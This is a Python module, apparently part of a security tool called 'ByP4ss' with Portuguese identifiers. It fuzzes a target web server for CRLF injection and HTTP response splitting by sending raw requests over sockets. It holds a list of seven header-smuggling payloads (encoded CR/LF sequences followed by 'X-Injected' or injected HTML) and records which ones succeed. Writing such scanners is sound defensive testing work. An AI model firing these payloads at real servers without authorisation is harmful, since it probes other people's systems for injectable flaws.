# FuzzCrlf do ByP4ss
# Testa injecao de CRLF (%0d%0a) em paths/headers, detecta response splitting.
# Chamado por FuzzEngine: Mod.Testar(Alvo, Iteracoes) -> dict

import time
import socket

from Core.Config import Config
from Core.Log import Log


class FuzzCrlf:

    PAYLOADS = [
        "%0d%0aX-Injected: 1",
        "%0aX-Injected: 1",
        "%0dX-Injected: 1",
        "%0d%0a%0d%0a<html>injected</html>",
        "%E5%98%8A%E5%98%8DX-Injected: 1",
        "\\r\\nX-Injected: 1",
        "%23%0d%0aX-Injected: 1",
    ]
    TIMEOUT = 1.5

    @staticmethod
    def Testar(Alvo, Iteracoes):
        Resultado = {
            "ok": True, "tecnica": "crlf",
            "iteracoes": int(Iteracoes or 100),
            "crashes": [], "anomalias": [],
            "duracao_s": 0.0,
        }
        if not Alvo:
            Resultado["ok"] = False
            Resultado["motivo"] = "alvo_ausente"
            return Resultado
        Inicio = time.monotonic()
        Porta = 80
        Count = 0
        for Payload in FuzzCrlf.PAYLOADS:
            if Count >= Resultado["iteracoes"]:
                break
            R = FuzzCrlf._TestarPath(Alvo, Porta, Payload)
            Count += 1
            FuzzCrlf._Registrar(R, Payload, "path", Resultado)
        for Payload in FuzzCrlf.PAYLOADS:
            if Count >= Resultado["iteracoes"]:
                break
            R = FuzzCrlf._TestarHeader(Alvo, Porta, Payload)
            Count += 1
            FuzzCrlf._Registrar(R, Payload, "header", Resultado)
        Resultado["iteracoes"] = Count
        Resultado["duracao_s"] = round(time.monotonic() - Inicio, 2)
        return Resultado

    @staticmethod
    def _TestarPath(Alvo, Porta, Payload):
        return FuzzCrlf._Enviar(Alvo, Porta, f"GET /{Payload} HTTP/1.1",
                                 f"GET /{Payload} HTTP/1.1")

    @staticmethod
    def _TestarHeader(Alvo, Porta, Payload):
        return FuzzCrlf._Enviar(Alvo, Porta, "GET / HTTP/1.1",
                                 f"X-Fuzz: {Payload}")

    @staticmethod
    def _Enviar(Alvo, Porta, RequestLine, HeaderLine):
        Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Sock.settimeout(FuzzCrlf.TIMEOUT)
        try:
            if Sock.connect_ex((Alvo, Porta)) != 0:
                return {"ok": False, "motivo": "conexao_falhou"}
            Req = (f"{RequestLine}\r\nHost: {Alvo}\r\n"
                   f"{HeaderLine}\r\nConnection: close\r\n\r\n")
            Sock.sendall(Req.encode("utf-8", errors="replace"))
            Dados = Sock.recv(4096)
            Texto = Dados.decode("utf-8", errors="replace").lower()
            return {
                "ok": True,
                "status": FuzzCrlf._Status(Dados),
                "injecao": ("x-injected" in Texto or "<html>injected" in Texto),
                "tamanho": len(Dados),
            }
        except socket.timeout:
            return {"ok": False, "motivo": "timeout"}
        except Exception as E:
            return {"ok": False, "motivo": type(E).__name__}
        finally:
            try: Sock.close()
            except Exception: pass

    @staticmethod
    def _Status(Dados):
        if not Dados:
            return 0
        try:
            P = Dados.split(b"\r\n", 1)[0].decode("utf-8", errors="replace").split()
            if len(P) >= 2:
                return int(P[1])
        except Exception:
            pass
        return 0

    @staticmethod
    def _Registrar(R, Payload, Onde, Resultado):
        if not R.get("ok"):
            if R.get("motivo") == "timeout":
                Resultado["anomalias"].append({
                    "tipo": "timeout", "onde": Onde, "payload": Payload[:40],
                })
            return
        if R.get("injecao"):
            Resultado["crashes"].append({
                "tipo": "crlf_injection", "onde": Onde,
                "payload": Payload[:40], "status": R.get("status"),
            })
        elif R.get("status", 0) >= 500:
            Resultado["crashes"].append({
                "tipo": "http_5xx", "onde": Onde,
                "payload": Payload[:40], "status": R.get("status"),
            })

    @staticmethod
    def Info():
        return {"nome": "FuzzCrlf", "payloads": len(FuzzCrlf.PAYLOADS)}
